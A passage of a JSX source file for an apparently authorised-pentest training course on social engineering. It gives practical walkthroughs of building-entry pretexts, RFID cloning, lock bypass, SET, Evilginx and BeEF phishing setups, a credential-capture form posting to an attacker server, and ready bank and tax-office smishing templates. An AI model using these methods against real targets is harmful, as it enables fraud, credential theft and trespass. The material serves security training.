      'The callback phishing (BazarCall) technique is highly effective because the victim initiates the call themselves, removing suspicion, and the email contains no malicious links.',
      'Voice cloning tools like ElevenLabs can clone a voice from 60 seconds of audio - documented fraud cases include a $25M deepfake video call and $243k CEO voice clone fraud.',
      'Multi-stage vishing (reconnaissance call first, exploitation call second) dramatically increases success rates by using real internal details gathered in Stage 1.',
    ],
  },

  {
    id: 'ch04-physical',
    title: 'Physical Social Engineering',
    difficulty: 'ADVANCED',
    readTime: '20 min',
    content: (
      <div>
        <P>Physical social engineering bypasses physical security controls through deception rather than technology. Tailgating, badge cloning, and USB drops have compromised organisations with multi-million dollar technical security stacks. Humans are trained to be polite, helpful, and non-confrontational - all qualities that physical social engineers exploit systematically.</P>

        <Note>Physical penetration testing requires explicit written authorisation specifying which locations may be tested. Always carry a get-out-of-jail letter with a contact number for the client to confirm legitimacy if you are detained. Stop the test immediately if law enforcement is called.</Note>

        <H2>Tailgating vs Piggybacking</H2>
        <Table
          headers={['TECHNIQUE', 'DEFINITION', 'HOW TO EXECUTE']}
          rows={[
            ['Tailgating', 'Following authorised person through secure door without their knowledge', 'Time entry closely behind them, act distracted (phone), carry items'],
            ['Piggybacking', 'Following through door WITH the knowledge of the authorised person', 'Ask them to hold the door, they assume you have access'],
            ['Social tailgating', 'Engaging person in conversation until they hold the door', 'Start conversation in car park, continue through entry point naturally'],
          ]}
        />

        <H2>Physical Reconnaissance</H2>
        <Pre label="// PHYSICAL RECON METHODOLOGY">{`# Remote reconnaissance (before site visit):
# Google Maps / Street View: building layout, entrances, car parks
# Bing Maps bird's-eye view: roof equipment, loading docks, outbuildings
# Company website: office photos, team photos showing badge/desk areas
# LinkedIn employee photos: often show interior office spaces
# Job postings: "on-site role at our Melbourne CBD office" -> confirms location
# Instagram / social media: employees often post office photos

# On-site reconnaissance (surveillance visit):
# Visit as a legitimate visitor first (coffee meeting, job interview)
# Observe: badge system type, reception process, visitor management
# Note: security cameras placement, guard presence, desk layout
# Photograph: externally visible security keypads, badge readers
# Time: employee arrival/departure patterns (tailgate windows)
# Social engineering recce: chat with receptionist, delivery people

# Building access timing:
# Best windows for tailgating:
#   - Morning rush: 8:00-9:30am (high volume, people distracted)
#   - Lunch: 12:00-1:00pm (people going in/out frequently)
#   - Package delivery: align timing with delivery vehicles
# Worst times:
#   - Mid-morning / mid-afternoon (low traffic, guards alert)
#   - After-hours (security heightened, minimal cover)`}</Pre>

        <H2>Physical Pretext Development</H2>
        <Pre label="// PRETEXT SCENARIOS AND PROPS">{`# Delivery person (most effective, least challenged):
# Props: uniform shirt (Amazon, FedEx, DHL style), trolley, packages
# Script: "Delivery for COMPANY_NAME reception - got a signature?"
# Why it works: creates social obligation to assist, time pressure
# Next level: pre-schedule real delivery to confirm entry protocols

# IT Support (high access granted):
# Props: polo shirt with generic "IT Services" logo, laptop bag,
#        tools case, lanyard with badge (printable template)
# Script: "IT here for the scheduled workstation upgrade on floor 3"
# OSINT: get manager name from LinkedIn, reference them by name
# Confirm: "I spoke with MANAGER_NAME this morning about this"

# Fire Marshal / Building Inspector:
# Props: hi-vis vest, clipboard, official-looking forms
# No IT knowledge needed - focus on physical access
# Access to server rooms, plant rooms, sensitive areas
# "I need to check the fire suppression system in the server room"

# New Employee:
# "My badge is still being processed - first week"
# Extremely effective: other employees want to be helpful
# Provides plausible explanation for not having access
# Dress code match is critical - research company dress norms

# Vendor / Contractor:
# "I am here for the quarterly HVAC maintenance"
# "Contracted by JLL for the building audit this week"
# Receptionist has no way to verify sub-contractors`}</Pre>

        <H2>Badge and RFID Attacks</H2>
        <Pre label="// RFID AND ACCESS CARD CLONING">{`# Common access card technologies:
# EM4100 / HID Prox: 125kHz, low-frequency, NO encryption
#   -> Trivially clonable with $5 reader/writer
#   -> Still deployed in massive numbers globally
# HID iCLASS: 13.56MHz, some with encryption
# MIFARE Classic: 13.56MHz, known vulnerabilities (CRYPTO1 cipher)
# HID SEOS / DESfire EV2: encrypted, harder to clone

# Proxmark3 (gold standard for RFID research):
# proxmark3 auto         -> identify card type automatically
# proxmark3 lf search    -> search for low-frequency card
# proxmark3 lf hid read  -> read HID card data
# proxmark3 lf hid clone --r CARD_DATA -> clone to blank T5577
# Range: up to 10-15cm depending on antenna

# Flipper Zero (accessible, portable):
# Read: approach to within 5cm of badge on lanyard
# RFID -> Read -> stores card data
# Clone to Flipper's T5577 emulation
# Emulate: RFID -> Emulate -> select saved card
# Can also save and replay: iButton, NFC, sub-GHz remotes

# Attacking from distance:
# Long-range RFID reader: modified with high-gain antenna
# Can read HID Prox cards from 30-50cm in optimal conditions
# Custom PCB readers exist for 1m+ range attacks
# Physical attack: request to see target's badge ("nice photo!")

# After cloning:
# Print matching physical badge using professional badge printer
# Laminates, holograms: available from ID badge supply companies
# Goal: visual + electronic match to legitimate employee badge`}</Pre>

        <H2>Lock Picking and Physical Bypass</H2>
        <Pre label="// PHYSICAL SECURITY BYPASS TECHNIQUES">{`# Lock picking fundamentals:
# Pin tumbler lock: most common in commercial settings
# Components: driver pins, key pins, spring, plug, shear line
# Single pin picking (SPP): set each pin individually
# Raking: rapidly manipulate multiple pins with serrated pick
# Tools: tension wrench (turning pressure) + pick (manipulate pins)
# Skill level: basic locks in 30-60 seconds with practice

# Bump key technique:
# Specially cut key that maximises pin jump
# Insert, apply tension, bump -> pins momentarily clear shear line
# Effective against: most pin tumbler locks
# Not effective: security pins (spool, serrated), disc detainers

# Bypass attacks (often faster than picking):
# Under-door tool (loop tool):
#   Slide under door, hook handle -> pull door handle down from outside
#   Works on outward-opening doors with lever handles
#   Inexpensive, 30-second bypass, widely effective

# Shim attack (padlocks):
#   Thin metal shim inserted into shackle hole
#   Releases spring-loaded locking mechanism
#   Works on most cheap padlocks
#   Lasso/double shim for double-locking padlocks

# Door gap attacks:
#   Flexible bypass tool inserted in door frame gap
#   Manipulate latch mechanism from outside
#   Works on: spring latches, crash bars, basic fire doors
#   Tools: Gator clip, J-tool, traveller hook

# REX (Request to Exit) sensor bypass:
#   Motion sensor on inside triggers door release
#   Spray can of compressed air under door activates sensor
#   Door opens without badge swipe`}</Pre>

        <H2>USB Drop Attacks and Physical Implants</H2>
        <Pre label="// USB DROPS AND HARDWARE IMPLANTS">{`# USB drop attack psychology:
# 67% of people plug in found USB drives (IBM study)
# Effectiveness varies with label:
#   "Q4 Salary Review - Confidential"  -> very high curiosity
#   "Board Meeting Notes - Do Not Share" -> high
#   Unmarked drive                      -> medium
# Drop locations: car park, reception, printer area, bathroom

# Rubber Ducky (Hak5):
# Appears as standard USB flash drive
# Detected as keyboard (HID device) - bypasses AV inspection
# Types pre-programmed DuckyScript payload at 1000 WPM
# Script: wait 2s, Win+R, type powershell, execute download cradle
# Payload execution in under 5 seconds before user can react

# O.MG Cable:
# Physically indistinguishable from legitimate USB-C cable
# Contains WiFi-enabled microcontroller inside cable body
# Attacker connects remotely -> executes keystrokes on victim machine
# Ideal for planted in conference rooms, charging stations

# Bash Bunny (Hak5):
# Multi-mode attack: HID + storage + serial + Ethernet emulation
# Pre-loaded attack payloads: credential harvesting, reverse shell
# Ethernet emulation: captures NetNTLMv2 hashes via Responder

# Juice jacking (malicious charging stations):
# Modified USB charging point injects data alongside power
# Primarily iOS/Android data exfiltration
# Custom firmware: screen recording, contact exfiltration
# Defence: use USB data blocker (charge-only adapter)

# Dumpster diving targets:
# Employee handbooks: internal jargon, org structure
# Org charts and phone directories: names for spear phishing
# Post-it passwords: still extremely common
# Old ID badges: copy design for forgery
# Shredded documents: cross-cut more secure than strip shred`}</Pre>

        <H2>Physical Security Assessment Methodology</H2>
        <Pre label="// STRUCTURED PHYSICAL PENTEST">{`# Engagement phases:
# 1. Pre-engagement: written scope, get-out-of-jail letter,
#    emergency contact number, photo of yourself for security
#    Define: which buildings, which floors, what counts as success
#    Metrics: did you access server room, steal laptop, plant device?

# 2. Reconnaissance (1-3 days external):
#    Physical survey, timing observation, photo documentation
#    Identify: weak entry points, delivery procedures, blind spots

# 3. Execution:
#    Start with lowest-risk pretext, escalate as needed
#    Document everything: timestamps, photos, access achieved
#    Photograph: server room, desks, screens, network equipment
#    Plant (if in scope): test USB devices, tracking beacons

# 4. Reporting:
#    Photographic evidence of access achieved
#    Exploitability rating per vulnerability
#    Impact: what could an attacker do with this access?
#    Recommendations: mantraps, anti-tailgating, visitor mgmt,
#       RFID upgrade to encrypted cards, locked screen policies`}</Pre>

        <Warn>Physical penetration testing without explicit written authorisation is trespassing and potentially breaking and entering. Always carry the client authorisation letter and emergency contact number. If challenged by security or police, stop immediately, identify yourself, and call the client contact.</Warn>
      </div>
    ),
    takeaways: [
      'Tailgating works because humans are polite and non-confrontational - social obligation to hold doors and avoid challenging strangers overrides security training.',
      'EM4100 and HID Prox cards (125kHz) are trivially clonable with sub-$20 hardware and are still deployed in enormous numbers globally.',
      'The Rubber Ducky executes keyboard-emulated payloads before an antivirus can respond because it presents as a HID device, not storage, bypassing most endpoint inspection.',
      'Physical bypass tools (under-door loop tool, shims, REX sensor bypass) are often faster than lock picking and require minimal skill for basic commercial door hardware.',
      'Always carry a get-out-of-jail letter and client emergency contact number during physical operations - stop immediately if law enforcement is involved.',
    ],
  },

  {
    id: 'ch05-osint',
    title: 'OSINT for Social Engineering',
    difficulty: 'INTERMEDIATE',
    readTime: '17 min',
    content: (
      <div>
        <P>Open Source Intelligence (OSINT) is the research phase that transforms generic social engineering templates into precision targeted attacks. The more you know about a target, the more believable the pretext, the higher the success rate. A well-researched phishing email references real names, real projects, and real tools - the victim has no reason to be suspicious.</P>

        <H2>Individual Target Profiling</H2>
        <Pre label="// BUILDING A TARGET DOSSIER">{`# LinkedIn (primary source for corporate targeting):
theharvester -d targetcompany.com -b linkedin
# Manual deep dive:
# - Full name, job title, seniority level
# - Department and reporting structure
# - Direct reports (potential accomplices in pretext)
# - Employment history (references to old companies = pretext)
# - Skills section: what tools do they use daily?
# - Recent posts/activity: what are they currently working on?
# - Education: alma mater = rapport building hook
# - Connections: do you share any connections? (social proof)

# LinkedIn company page analysis:
# - Employee count (headcount for scale of target set)
# - Recent company updates (new products, acquisitions, offices)
# - "People also viewed" -> similar target companies
# - Job postings -> reveals internal tech stack

# Reconstructing org chart from LinkedIn:
# Search: "company_name manager" or "company_name director IT"
# Build: CEO -> VP -> Director -> Manager -> IC chains
# Useful for: which name to impersonate, who reports to whom`}</Pre>

        <H2>Email Address Discovery</H2>
        <Pre label="// FINDING EMPLOYEE EMAIL ADDRESSES">{`# Hunter.io (most popular):
# Free tier: 25 searches/month
# hunter.io/domain-search -> enter targetcompany.com
# Returns: all discovered emails, confidence score, sources
# API: curl https://api.hunter.io/v2/domain-search?domain=TARGET.com&api_key=KEY_HERE

# Phonebook.cz (OSINT phonebook):
# phonebook.cz -> search domain
# Returns: emails, domains, URLs from certificate transparency + breaches

# Email permutation tools:
# EmailHippo, Voila Norbert, verify.email
# Take name + domain, generate common patterns:
#   FIRST.LAST@company.com
#   FLAST@company.com
#   FIRST@company.com
#   FIRSTL@company.com

# TheHarvester (multi-source):
theharvester -d targetcompany.com -b google,linkedin,hunter
# Sources: Google, Bing, LinkedIn, Hunter, PGP keyservers

# Breach data correlation:
# HaveIBeenPwned API: check if email appears in breaches
# DeHashed (paid): search breached credentials by domain
# Use: find personal email addresses from corporate email patterns
# Cross-reference: corporate email found -> personal email guessed
#                  personal email found in breach -> password reuse risk

# MX record analysis (identifies email platform):
dig MX targetcompany.com
# mail.protection.outlook.com -> Microsoft 365
# aspmx.l.google.com          -> Google Workspace
# mxX.mailgun.org             -> Mailgun
# Knowing email platform shapes which phishing template to use`}</Pre>

        <H2>Identifying Internal Technology Stack</H2>
        <Pre label="// TECH STACK INTELLIGENCE FOR PRETEXTING">{`# Job postings reveal everything:
# "Experience with Salesforce CRM" -> pretext: Salesforce support
# "Okta administration experience" -> MFA platform identified
# "Cisco AnyConnect VPN" -> VPN product for IT pretext
# "AWS/Azure/GCP experience" -> cloud platform for vendor impersonation
# "Workday HRIS administration" -> HR system for payroll pretext

# LinkedIn skills sections:
# Employee Skills tab -> specific tools listed
# Aggregate across multiple employees -> confident in tech stack

# Shodan / Censys for external tech:
shodan search "org:TargetCompany"
# Returns: exposed services, software versions, certificate data
# Certificates often contain internal subdomain names
# Job board aggregators: Indeed, Seek, LinkedIn Jobs

# Google dork for tech detection:
site:targetcompany.com "powered by" OR "Outlook Web" OR "Citrix"
site:targetcompany.com filetype:pdf OR filetype:xlsx
# PDFs often contain internal document templates
# Useful: logos, fonts, internal terminology

# Network ranges for pretexting:
# ARIN/RIPE WHOIS: what IP ranges does the company own?
# Reverse DNS: what internal service names are exposed?
# SSL certificate Subject Alternative Names: internal subdomain list
# All useful for making IT pretext calls sound authentic`}</Pre>

        <H2>Social Media Intelligence</H2>
        <Pre label="// SOCIAL MEDIA OSINT FOR SE">{`# LinkedIn activity analysis:
# What has target liked/commented on recently?
# -> Use in pretext: "I saw your comment on the DevSecOps post"
# Who are they publicly connected to?
# -> Name-drop shared connections for social proof

# Twitter/X (high personal information density):
# Search: "from:TARGET_HANDLE company_name"
# What do they complain about? (technology frustrations)
# What events do they attend? (conference pretext)
# What time do they work? (call timing)
# Search: "to:TARGET_HANDLE" -> what colleagues tag them in

# GitHub:
# What projects do they contribute to?
# What organisations are they a member of?
# Code comments can reveal: internal tool names, API names
# Email addresses in git commits may differ from corporate email
# git log --pretty="%an %ae" -> author name + email history

# Facebook / Instagram:
# Personal relationships for social engineering pressure
# Holiday dates (when out of office)
# Physical location patterns (relevant for physical SE)
# Vehicle (car park reconnaissance)
# Home area (for social context in vishing)

# Physical environment from social media:
# Office photos (monitor content, desk layouts, ID badge design)
# Team event photos (who works together, informal hierarchy)
# Note: most people do not realise their Instagram is public`}</Pre>

        <H2>Maltego for Relationship Mapping</H2>
        <Pre label="// MALTEGO OSINT WORKFLOW">{`# Maltego: graphical link analysis tool
# Community edition: free, limited transforms
# Pro/commercial: full transform set, Team collaboration

# Key transforms for SE:
# Email -> Person (resolve email to social profiles)
# Domain -> Email Addresses (Hunter.io integration)
# Person -> Phone Number
# Person -> Social Profiles (LinkedIn, Twitter, Facebook)
# Organisation -> People (employee enumeration)
# Domain -> Technologies (BuiltWith, Shodan transforms)

# Building target graph:
# Start: targetcompany.com
# Run: To Email Addresses -> To Persons -> To Social Media
# Result: web of employees, relationships, contact details
# Identify: most connected nodes = highest value targets
#           isolated nodes = potential weak links

# Relationship pressure points:
# Find: target's manager and skip-level manager
# Impersonate manager for authority + urgency combined
# Find: target's close colleagues (frequent interactions)
# Reference them by name for social proof`}</Pre>

        <H2>Watering Hole Research</H2>
        <Pre label="// IDENTIFYING TARGET COMMUNITIES">{`# Watering hole principle: attackers compromise sites targets visit
# For SE: used to understand target's online behaviour + interests

# Finding forums and communities:
# LinkedIn groups the target is a member of
# GitHub organisations they contribute to
# Reddit communities (r/netsec, r/sysadmin, r/devops)
# Slack communities (many are publicly joinable)
# Conference attendee lists: DEF CON, Black Hat, RSA, local BSides

# Conference and event targeting:
# "Are you attending AWS re:Invent this year?"
# -> if target attends, conference pretext is highly believable
# "I saw your talk at OWASP AU last month"
# -> creates instant credibility and familiarity

# Physical layout from public sources:
# Company review sites (Glassdoor, Indeed): office environment descriptions
# Google Maps interior photos: some buildings have interior street view
# Bing Maps bird's eye: roof access, adjacent buildings
# LinkedIn location check-ins: confirms which office they work from`}</Pre>
      </div>
    ),
    takeaways: [
      'Job postings are an underutilised gold mine - they reveal exact internal tools (Okta, Salesforce, Cisco AnyConnect) that make phishing and vishing pretexts highly believable.',
      'MX record analysis immediately identifies the email platform (M365, Google Workspace) - this determines which phishing template and which credential harvester to use.',
      'LinkedIn org chart reconstruction from public profiles enables impersonation of specific managers, making authority-based pretexts verifiable to the target.',
      'Breach data from services like DeHashed allows correlation of corporate email addresses to personal email addresses, extending the attack surface beyond corporate controls.',
      'Maltego transforms automate relationship mapping across multiple data sources - visualising the employee graph reveals the most connected (and thus most valuable) targets.',
    ],
  },

  {
    id: 'ch06-tools',
    title: 'Digital Social Engineering Tools',
    difficulty: 'ADVANCED',
    readTime: '20 min',
    labLink: '/modules/social-engineering/lab',
    content: (
      <div>
        <P>A range of specialised frameworks automates the infrastructure and delivery components of social engineering attacks. Understanding these tools is essential for both offensive use in authorised engagements and for defenders who need to understand what attackers are capable of deploying.</P>

        <H2>Social Engineer Toolkit (SET)</H2>
        <Pre label="// SET MODULE WALKTHROUGH">{`# Install:
git clone https://github.com/trustedsec/social-engineer-toolkit
cd social-engineer-toolkit
pip3 install -r requirements.txt
python3 setup.py

# Launch:
sudo setoolkit

# Main menu:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules

# === CREDENTIAL HARVESTER (most common) ===
# Menu: 1 -> 2 (Website Attack Vectors) -> 3 (Credential Harvester)
# Option 2: Site Cloner
# Enter URL to clone: https://login.microsoftonline.com
# SET clones the page, serves on your IP/domain
# All credentials submitted are captured and printed

# === SPEAR PHISHING ATTACK ===
# Menu: 1 -> 1 (Spear-Phishing Attack Vectors)
# -> 1 (Perform a Mass Email Attack)
# Select payload: choose Metasploit reverse shell payload type
# SET creates malicious attachment (.pdf, .docx, etc.)
# Configure SMTP settings -> sends to target email list

# === HTA (HTML Application) ATTACK ===
# Menu: 1 -> 2 -> 5 (HTA Attack)
# Serves .hta file via web server
# Victim visits URL -> browser downloads and auto-executes .hta
# .hta runs embedded PowerShell -> reverse shell
# Still effective against unpatched/legacy Windows

# === TABNABBING ===
# Menu: 1 -> 2 -> 4
# Victim opens page -> leaves tab -> tab content changes to fake login
# Victim returns -> sees "session expired" -> re-enters credentials
# Psychological trick: page was "trusted" when first opened

# === WEB JACKING ATTACK ===
# Menu: 1 -> 2 -> 6
# Hijacks link to display malicious page
# URL appears legitimate in initial hover
# On click: redirect to attacker-controlled clone`}</Pre>

        <H2>Evilginx2 and Modlishka</H2>
        <Pre label="// REVERSE PROXY PHISHING FRAMEWORKS">{`# Evilginx2: AiTM (Attacker in the Middle) phishing
# Proxies REAL target site - victim interacts with legitimate service
# After MFA completion: session cookie captured
# Bypasses: TOTP, push notification, SMS OTP
# Does NOT bypass: FIDO2 hardware keys (domain-bound)

# Phishlet configuration (Microsoft 365 example):
# phishlets hostname o365 login.YOUR_DOMAIN.com
# phishlets enable o365
# lures create o365
# lures get-url 0  -> get unique lure URL

# Modlishka (alternative reverse proxy):
git clone https://github.com/drk1wi/Modlishka
cd Modlishka && go build
# Configure config.json:
# - phishingDomain: your lookalike domain
# - target: real login target (login.microsoftonline.com)
# - credential: regex to capture credentials
# Run: ./Modlishka -config config.json

# Key difference:
# Evilginx2: uses phishlets (pre-configured per target site)
# Modlishka: more generic, handles any site but requires config
# Both: intercept TLS traffic, extract credentials + session tokens`}</Pre>

        <H2>King Phisher and CredSniper</H2>
        <Pre label="// ALTERNATIVE PHISHING FRAMEWORKS">{`# King Phisher:
git clone https://github.com/securestate/king-phisher
# Features:
# - SMS alerts when credentials submitted
# - Geo-location tracking of victims
# - Two-factor bypass support
# - Clicker/opener differentiation
# - Web server with template engine (Jinja2)
# - Python-based, extensive plugin system
# - Separate client/server architecture for team ops

# CredSniper:
git clone https://github.com/ustayready/CredSniper
pip install -r requirements.txt
# Focus: 2FA bypass via real-time relay
# Creates a proxy for Google/Office 365 login
# Automatically relays OTP codes in real-time
# Captures: session tokens after successful MFA

# ReelPhish:
# Real-time 2FA phishing relay (FireEye research tool)
# Browser automation: captures OTP from victim page
# Automatically inputs OTP on real site
# Timing-sensitive: OTP must be used within 30s TOTP window

# BlackEye / Zphisher:
# Pre-built phishing page templates (30+ services)
# Instagram, Facebook, Google, Microsoft, Netflix, PayPal
# Automated: domain hosting, ngrok tunnelling
# For rapid deployment in capture-the-flag style testing`}</Pre>

        <H2>Browser Exploitation Framework (BeEF)</H2>
        <Pre label="// BEEF BROWSER HOOKING">{`# BeEF hooks victim's browser via JavaScript
# Once hooked: attacker has persistent browser-level access

# Install:
git clone https://github.com/beefproject/beef
cd beef && bundle install
./beef
# Dashboard: http://localhost:3000/ui/panel
# Hook URL: http://YOUR_IP:3000/hook.js

# Delivery methods (get victim to load hook.js):
# Phishing email with link to hooking page
# XSS injection on legitimate site
# SET credential harvester includes hook.js in cloned page
# Watering hole attack on site targets visit

# Post-hook capabilities:
# Browser fingerprinting: OS, browser, plugins, installed extensions
# Network discovery: scan victim's LAN from their browser
# Clipboard steal: read clipboard contents
# Webcam/microphone: request browser permissions
# Keylogger: log all keystrokes in browser
# Redirect to exploit: send to Metasploit browser exploit page
# Social engineering: display fake plugin update popups
# Screenshot: capture current browser view
# Get geolocation via browser API

# Combined with Metasploit:
# BeEF browser fingerprint -> select matching exploit
# Deliver exploit via BeEF redirect command`}</Pre>

        <H2>Gophish - Advanced Usage</H2>
        <Pre label="// GOPHISH API AND ADVANCED FEATURES">{`# GoPhish REST API for automation:
# Base URL: https://localhost:3333/api/

# Create campaign via API:
curl -X POST https://localhost:3333/api/campaigns/ \
  -H "Authorization: KEY_HERE" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Q4 Campaign",
    "template": {"name": "IT Security Alert"},
    "url": "https://YOUR_PHISH_DOMAIN.com",
    "page": {"name": "M365 Login"},
    "smtp": {"name": "Postfix Server"},
    "groups": [{"name": "Finance Department"}],
    "launch_date": "2025-01-15T09:00:00+00:00"
  }'

# Get campaign results:
curl -X GET https://localhost:3333/api/campaigns/1/results \
  -H "Authorization: KEY_HERE"
# Returns: JSON with all events (email_sent, email_opened,
#          clicked_link, submitted_data) per target

# Custom 404 redirect (avoid detection):
# Set landing page redirect to real site after credential capture
# Custom 404 page mimics target's real 404 page
# Legitimate-looking SSL certificate
# Domain aged 30+ days before use
# Avoid: newly registered domains trigger email gateway flags

# Tracking pixel customisation:
# GoPhish embeds unique tracking image per recipient
# Image load = open event recorded
# Some email clients block remote images: affects open rate metric
# Click tracking is more reliable than open tracking`}</Pre>

        <H2>Website Cloning Tools</H2>
        <Pre label="// CLONING LEGITIMATE SITES">{`# HTTrack (offline website copier):
apt install httrack
httrack https://login.targetsite.com -O ./cloned_site
# Recursively downloads all assets
# Creates fully offline copy
# Edit: change form action to point to credential capture script

# wget mirror:
wget --mirror --convert-links --page-requisites \
     --no-parent https://login.targetsite.com

# SET built-in site cloner:
# setoolkit -> 1 -> 2 -> 3 -> 2 (Site Cloner)
# Enter IP for POST capture
# Enter URL to clone -> automated download and setup

# After cloning - what to modify:
# Form action: <form action="https://YOUR_SERVER/capture.php">
# Add: capture.php script to log POST data then redirect
# SSL: must have valid cert (Let's Encrypt for free)
# Hosting: deploy on VPS, not localhost (targets external)

# Modern considerations:
# Many sites use React/Angular/Vue (SPA)
# Static clone will not work - need reverse proxy approach
# Evilginx2 handles SPAs automatically via proxy`}</Pre>
      </div>
    ),
    takeaways: [
      'SET (Social Engineer Toolkit) covers the full attack surface: credential harvesting, spear phishing, HTA execution, tabnabbing, and browser exploitation from a single menu-driven interface.',
      'Evilginx2/3 and Modlishka are reverse proxy frameworks that bypass TOTP and push MFA by relaying authentication through them and capturing session cookies after MFA completes.',
      'BeEF hooks victim browsers via a single JavaScript tag, granting persistent access to run browser-level attacks including network scanning, keylogging, and Metasploit exploit delivery.',
      'GoPhish REST API enables programmatic campaign management - useful for automating large-scale engagements and integrating phishing data with SIEM or ticketing systems.',
      'Website cloning tools (HTTrack, wget, SET cloner) handle static sites but modern SPAs (React/Angular) require reverse proxy approaches like Evilginx2 for effective cloning.',
    ],
  },

  {
    id: 'ch07-smishing',
    title: 'Smishing and Mobile Social Engineering',
    difficulty: 'INTERMEDIATE',
    readTime: '14 min',
    content: (
      <div>
        <P>Smishing (SMS phishing) exploits the higher trust people have in text messages compared to email, combined with the fact that mobile devices lack the filtering infrastructure and link preview capabilities of desktop email clients. A 98% SMS open rate (vs 20% for email) makes SMS an extremely effective delivery channel for social engineering.</P>

        <H2>Why Smishing Works Better Than Email Phishing</H2>
        <Table
          headers={['FACTOR', 'EMAIL PHISHING', 'SMISHING']}
          rows={[
            ['Open rate', '20-25%', '98%'],
            ['Click rate from opens', '3-5%', '19-26%'],
            ['Spam filtering', 'Sophisticated ML/AI gateways', 'Basic carrier filtering only'],
            ['URL visibility', 'Browser shows full URL on hover', 'Mobile hides URL - only shows destination after click'],
            ['Sandbox analysis', 'Enterprise email gateways sandbox links', 'SMS has no equivalent gateway'],
            ['User trust level', 'High scepticism (trained)', 'Lower scepticism - SMS feels personal'],
          ]}
        />

        <H2>High-Effectiveness Smishing Pretexts</H2>
        <Pre label="// SMS PRETEXT TEMPLATES">{`# Parcel delivery (currently most effective globally):
"Your parcel could not be delivered. A DELIVERY_FEE_HERE delivery
fee is required. Reschedule at: https://SHORT_URL_HERE"
-> Fake Royal Mail / Australia Post / FedEx / DHL page
-> Steals: credit card details + 3DS OTP

# Banking fraud alert:
"WESTPAC: Suspicious transaction of AMOUNT_HERE detected.
If not you, verify at: https://SHORT_URL_HERE
Reply STOP to opt out"
-> Fake bank login page -> credentials + MFA code

# Government impersonation:
"ATO: You have a tax refund of AMOUNT_HERE pending.
Claim by DATE_HERE: https://SHORT_URL_HERE"
-> Fake government portal -> Medicare number, bank details

# Two-factor pretext:
"Your Microsoft verification code is: CODE_HERE
Never share this code. Reply STOP to unsubscribe."
-> Sent simultaneously while attacker uses victim's credentials
-> Victim assumes they triggered MFA -> shares code when asked

# Job offer:
"Hi NAME_HERE, we found your profile on LinkedIn.
Salary: SALARY_HERE. Details: https://SHORT_URL_HERE"
-> Credential harvest or malware download page`}</Pre>

        <H2>SMS Spoofing and Infrastructure</H2>
        <Pre label="// SMS SENDING INFRASTRUCTURE">{`# Twilio API (most flexible for authorised testing):
pip install twilio
# Code pattern for testing:
# from twilio.rest import Client
# client = Client(ACCOUNT_SID_HERE, AUTH_TOKEN_HERE)
# message = client.messages.create(
#   body="SMS content here",
#   from_="+1PHONE_NUM",
#   to="+TARGET_NUM"
# )
# Note: Twilio requires verified caller IDs for alphanumeric senders

# AWS SNS (mass SMS capability):
# sns.publish(PhoneNumber="+TARGET", Message="body")
# Cheaper at scale, less verification than Twilio

# Alphanumeric sender ID spoofing:
# Many countries allow alphanumeric sender (e.g. "WESTPAC")
# Sender appears as "WESTPAC" not a phone number
# Requires SMS gateway in countries without sender ID verification
# UK/AU: alphanumeric sender widely supported, easy to spoof

# SS7 attack (telecom-level):
# SS7 (Signaling System 7): core protocol of global telephone network
# Vulnerabilities allow: SMS interception, call rerouting
# Requires access to SS7 network (telco or state-level access)
# Used by: nation-state actors, organised crime for OTP interception
# Defences: number portability locks, SIM PIN, FIDO2 over SMS`}</Pre>

        <H2>QR Code Phishing (Quishing)</H2>
        <Pre label="// QUISHING ATTACK METHODOLOGY">{`# Why QR codes bypass email security:
# Email gateways scan URLs in text and HTML
# QR codes are images -> URL inside is not scanned
# No URL rewriting/reputation checking for QR codes
# Corporate proxies do not intercept mobile browser traffic
# Result: perfect bypass for enterprise email security

# QR phishing delivery vectors:
# Email: "Scan to complete your MFA registration"
# "Scan to access the shared document"
# "Scan for the meeting room booking"
# Physical: QR sticker placed over legitimate QR code
#   - Parking meters (fake payment QR)
#   - Conference posters (fake session wifi)
#   - Restaurant menus (fake menu QR with credential harvest)
#   - Charging stations ("scan for free wifi" -> credential page)

# Technical execution:
# Create QR code with any generator (qr-code-generator.com)
# Embed phishing URL inside QR
# Host: clone of Microsoft 365 / company SSO / payment page
# SSL cert required: mobile browsers flag http:// prominently

# Detection evasion:
# Use legitimate QR service that redirects: bit.ly, qr.io
# First scan: legitimate content (evades manual testing)
# Subsequent scans: malicious (switch after initial delivery check)

# Mobile targeting advantage:
# Mobile browsers have fewer security extensions
# No enterprise proxy on personal mobile data
# Touch interaction less deliberate than mouse (less URL scrutiny)
# Face ID / fingerprint = victim more casual about authentication`}</Pre>

        <H2>WhatsApp and Telegram Phishing</H2>
        <Pre label="// MESSAGING APP SOCIAL ENGINEERING">{`# WhatsApp impersonation:
# Create account with target's contact's name + profile photo
# Source photo: contact's LinkedIn / Facebook / Instagram
# Message victim from "known contact" number they do not have saved
# "Hey, I got a new number - can you do me a favour?"
# Classic pretext: voucher/gift card request from "friend"

# WhatsApp Business API:
# Allows verified business names as sender identity
# Legitimate businesses use this for notifications
# Abuse: register business account with bank/utility name
# Victim sees: "WESTPAC" as sender, not a phone number

# Telegram-specific attacks:
# Bot impersonation: create bot with company-looking username
# Channel impersonation: @TelegramSecurityTeam vs @TelegramSecurity
# Fake admin messages: premium users can send messages as channels
# Phishing: "Your account will be suspended, verify here"

# iMessage link previews:
# iOS generates automatic previews for URLs in iMessage
# Preview fetched by Apple -> cached -> served to victim
# Attacker can control what preview shows (Open Graph meta tags)
# og:title, og:description, og:image -> craft convincing preview
# Preview looks like: trusted bank site -> real link is phish

# WhatsApp link preview:
# Similar: WhatsApp generates previews from og: meta tags
# Set og:image to bank logo -> link looks like bank URL in preview
# Combine with URL shortener to hide actual destination`}</Pre>

        <H2>Mobile App Impersonation</H2>
        <Pre label="// FAKE APP DELIVERY AND MOBILE MALWARE">{`# App impersonation via web:
# Create mobile-optimised phishing page that looks like app login
# Match: icon, colour scheme, font, exact UI of target banking app
# Deliver via smishing link
# Victim on mobile -> full-screen browser -> looks identical to app

# Fake app distribution:
# Android sideloading: .apk files installable from any URL
# iOS Enterprise certificates: allow unofficial app installation
# Smishing: "Download our updated app: https://URL_HERE"
# Android: victim downloads .apk -> installs -> runs malware
# iOS: requires victim to trust enterprise cert (extra friction)

# Juice jacking updated threat model:
# Malicious charging station in airport, hotel, conference
# USB connection: data transfer possible alongside power
# iOS: pops up "Trust this computer?" -> social engineering moment
